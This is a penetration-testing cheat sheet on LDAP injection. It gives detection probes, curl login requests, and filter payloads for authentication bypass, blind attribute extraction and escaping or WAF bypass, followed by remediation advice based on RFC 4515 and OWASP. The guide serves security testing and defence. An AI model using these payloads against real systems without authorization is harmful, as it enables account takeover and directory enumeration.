# LDAP Injection

> User input concatenated into an LDAP search filter without escaping → filter logic mutation. Authorized testing only. Map: WSTG-INPV-06, CWE-90.

## TL;DR
- LDAP filter syntax uses parens + AND/OR/NOT operators. Injecting `*)(uid=*` closes one filter and opens an always-true clause.
- Most-affected: corporate auth via Active Directory / OpenLDAP, "find user by email" features, admin enumeration.
- Defence: escape user input per RFC 4515; better, use a parameterised search API (most modern LDAP libraries provide one).

## Detection / Discovery

Common LDAP-bound features:
- Login (`(uid={user})`).
- Search-user-by-email (`(mail={input})`).
- User exists check.
- Group membership.

| Probe | If response changes | Meaning |
| --- | --- | --- |
| `*` | Returns multiple users | Wildcard accepted — likely vulnerable. |
| `*)(&` | 500 / parse error | Filter syntax reached the parser; injectable. |
| `admin)(|(uid=*` | Different from baseline | Confirmed injection. |

```bash
# Login with wildcard password (if filter is naive AND):
curl -X POST https://target/login -d 'user=admin&pass=*'
# or filter-shape injection:
curl -X POST https://target/login -d 'user=admin)(&(password=*&pass=x'
```

## Exploitation

### Auth bypass (login)
Assume filter: `(&(uid={user})(password={pass}))`.

Submit `user = admin)(|(uid=*` and `pass = x`. Filter becomes:
```
(&(uid=admin)(|(uid=*))(password=x))
```
The `(|(uid=*))` part is always true; depending on the bind/compare logic, you may auth as `admin` or as any user.

### Boolean blind extraction
For "find user by name" features that return existence yes/no:
- `*` → all
- `a*` → starts with a
- `b*` → starts with b
- iterate

For attribute values: `(uid=admin)(mail=*)`. Compare with `(uid=admin)(mail=a*)`, etc.

### NULL-byte truncation (legacy)
On some old LDAP libraries, `\x00` truncates the filter — anything after isn't sent to the server. Bypasses the trailing `(password=...)`.

### Blind via timing on LDAP-bound `MATCHING-RULE` filters
Less common but exists — slow extension-OID filters time out at the server.

## Bypasses
- Server escapes `(` `)` but not `\` — use `\28` `\29` (RFC 4515 escape encoding) which the LDAP server unescapes back to `(`/`)`.
- WAF blocks `(uid=` but not `(cn=` / `(mail=` / `(sAMAccountName=` — adapt to schema.
- AD-specific attributes: `userPrincipalName`, `userPassword` (rarely readable), `sAMAccountName`, `memberOf`.

## Defence / Remediation
- **Escape per RFC 4515** §3:
  - `\` → `\5c`
  - `(` → `\28`
  - `)` → `\29`
  - `*` → `\2a`
  - `\x00` → `\00`
- Better: **parameterised search APIs** that build the filter for you (Java JNDI `SearchControls`; Python `ldap3` library's filter-builder helpers; .NET `SearchRequest.Filter`).
- **Schema validation** of input: usernames in your org match `^[a-zA-Z0-9._-]+$`, reject everything else.
- **Bind as a low-privilege service account** when performing search; bind as the user only after retrieving their DN — avoids accidental authentication when the filter is over-permissive.
- **Don't return raw LDAP errors** to the user — parse-error responses leak filter structure.
- CWE-90 Improper Neutralization of Special Elements used in an LDAP Query.

## Sources
- OWASP WSTG-INPV-06 LDAP Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
- OWASP Cheat Sheet — LDAP Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- PortSwigger — Some LDAP injection notes: https://portswigger.net/kb/issues/00100500_ldap-injection
- PayloadsAllTheThings LDAP Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- HackTricks LDAP Injection: https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html
- RFC 4515 — LDAP String Representation of Search Filters: https://datatracker.ietf.org/doc/html/rfc4515
- CWE-90: https://cwe.mitre.org/data/definitions/90.html
